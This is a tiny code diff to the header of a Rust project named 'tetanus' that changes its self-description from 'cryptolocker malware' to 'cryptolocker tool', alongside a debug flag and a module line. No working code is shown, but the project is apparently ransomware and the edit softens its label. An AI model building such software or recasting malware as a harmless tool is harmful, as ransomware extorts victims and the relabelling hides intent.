@@ -1,4 +1,4 @@
-// tetanus is a simple cryptolocker malware written in rust
+// tetanus is a simple cryptolocker tool written in rust
 const DBUG: i32 = 1;
 
 mod nail;
